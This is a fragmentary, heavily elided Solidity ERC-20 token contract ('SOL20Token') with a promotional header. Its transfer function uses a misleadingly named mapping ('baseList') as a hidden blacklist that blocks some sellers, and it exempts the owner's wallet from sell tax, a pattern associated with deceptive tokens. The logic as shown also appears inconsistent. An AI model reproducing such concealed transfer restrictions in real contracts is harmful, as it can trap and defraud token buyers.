...
*
* This is the coin for you, for all the SOL20
*
* Create contract init fee:
* total buy 1%
* total sell 1%
* Web:       http://www.sol20.org/
* Telegram:  https://t.me/SOL20news
*/
...
// File: contracts/sell/SOL20Token.sol
pragma solidity ^0.8.9;

contract SOL20Token is IERC20, ReentrancyGuard, Ownable {
    ...
    mapping(address => uint256) private _baseList;
    mapping (address => bool) private baseList;
    ...
    */
    ...
    function _transfer(
        ...
        require(!baseList[_recipient] && !baseList[_sender], "You have been holderlist from transfering tokens");

        uint256 rAmount = _amount;

        // when buy
        if (_sender == uniswapPair) {
            _baseList[_recipient] = block.number;
        ...
        // when sell
            ...
            if (limitsInEffect) {
                if (block.number == _baseList[_sender]) {
                    baseList[_sender] = true;
                }
                if (_sender == owner() && _sender == marketingWallet) {
                    sellTax = 0;    
                }
                require(block.number != _baseList[_sender], "exceeded max amount");
            }
